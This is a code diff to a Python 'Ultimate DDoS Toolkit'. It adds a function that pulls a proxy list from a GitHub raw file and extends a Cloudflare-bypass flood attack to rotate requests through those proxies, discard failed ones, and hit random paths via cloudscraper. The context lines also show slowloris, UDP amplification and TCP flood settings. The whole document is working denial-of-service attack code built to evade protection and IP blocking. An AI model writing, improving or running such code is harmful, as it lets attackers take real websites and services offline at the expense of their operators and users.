@@ -1,4 +1,4 @@
-# attack_methods.py - Ultimate DDoS Toolkit
+# attack_methods.py - Ultimate DDoS Toolkit with GitHub Proxy Support
 import socket
 import random
 import threading
@@ -10,7 +10,6 @@ from urllib.parse import urlparse
 import urllib3
 import cloudscraper
 import dns.resolver
-from fp.fp import FreeProxy
 
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -56,6 +55,29 @@ OPTIMAL_CONFIG = {
     "udp_amplification": {"threads": 3, "duration": 60},
     "tcp_mixed": {"threads": 6, "duration": 60},
 }
+
+# GitHub proxy list URL
+PROXY_LIST_URL = "https://raw.githubusercontent.com/Adamits1/files/main/proxies.txt"
+
+def fetch_proxies_from_github(url=PROXY_LIST_URL):
+    """Fetch proxy list from GitHub"""
+    try:
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            # Parse proxy list (one proxy per line in format ip:port)
+            proxies = []
+            for line in response.text.split('\n'):
+                line = line.strip()
+                if line and ':' in line and not line.startswith('#'):
+                    proxies.append(line)
+            print(f"Loaded {len(proxies)} proxies from GitHub")
+            return proxies
+        else:
+            print(f"Failed to fetch proxies: HTTP {response.status_code}")
+    except Exception as e:
+        print(f"Error fetching proxies: {e}")
+    
+    return []
 
 def resolve_target(target):
     """Resolve a target (URL or IP) to IP address and port with caching"""
@@ -504,7 +526,7 @@ def attack_slowloris(target, duration=60):
     print(f"Slowloris completed. Maintained up to {sockets_count} connections")
 
 def attack_cloudflare_bypass(target, duration=60):
-    """Advanced Cloudflare bypass with multiple techniques"""
+    """Advanced Cloudflare bypass with custom proxies from GitHub"""
     config = OPTIMAL_CONFIG["cloudflare_bypass"]
     threads = config["threads"]
     
@@ -520,6 +542,9 @@ def attack_cloudflare_bypass(target, duration=60):
     use_ssl = port == 443
     protocol = "https://" if use_ssl else "http://"
     base_url = f"{protocol}{ip}:{port}"
+    
+    # Fetch custom proxies from GitHub
+    proxy_list = fetch_proxies_from_github()
     
     # Advanced bypass headers
     bypass_headers_list = [
@@ -556,7 +581,7 @@ def attack_cloudflare_bypass(target, duration=60):
             while time.time() < end_time:
                 try:
                     # Rotate between different techniques
-                    technique = random.randint(0, 3)
+                    technique = random.randint(0, 4)
                     
                     if technique == 0:
                         # Method 1: Use cloudscraper to bypass challenges
@@ -603,25 +628,48 @@ def attack_cloudflare_bypass(target, duration=60):
                         requests_sent[0] += 1
                         performance_stats["requests_sent"] += 1
                     
-                    else:
-                        # Method 4: Use proxies to bypass IP restrictions
+                    elif technique == 3 and proxy_list:
+                        # Method 4: Use custom proxies from GitHub
+                        proxy = random.choice(proxy_list)
+                        
+                        # Handle different proxy formats
+                        if ':' in proxy and proxy.count(':') == 3:
+                            # Proxy with authentication: ip:port:username:password
+                            ip_part, port_part, username, password = proxy.split(':')
+                            proxy_url = f"http://{username}:{password}@{ip_part}:{port_part}"
+                        else:
+                            # Proxy without authentication: ip:port
+                            proxy_url = f"http://{proxy}"
+                        
+                        proxies = {
+                            'http': proxy_url,
+                            'https': proxy_url
+                        }
+                        
+                        headers = {
+                            'User-Agent': random.choice(USER_AGENTS),
+                        }
+                        
                         try:
-                            proxy = FreeProxy(rand=True).get()
-                            proxies = {
-                                'http': proxy,
-                                'https': proxy
-                            }
-                            
-                            headers = {
-                                'User-Agent': random.choice(USER_AGENTS),
-                            }
-                            
                             response = session.get(base_url, headers=headers, 
                                                  proxies=proxies, timeout=5)
                             requests_sent[0] += 1
                             performance_stats["requests_sent"] += 1
                         except:
-                            pass
+                            # Remove failed proxy from list
+                            if proxy in proxy_list:
+                                proxy_list.remove(proxy)
+                    
+                    else:
+                        # Method 5: Use cloudscraper with random path
+                        headers = {
+                            'User-Agent': random.choice(USER_AGENTS),
+                        }
+                        
+                        response = scraper.get(base_url + f"/{random.randint(1000,9999)}", 
+                                             headers=headers, timeout=5)
+                        requests_sent[0] += 1
+                        performance_stats["requests_sent"] += 1
                     
                     time.sleep(0.1)
                     
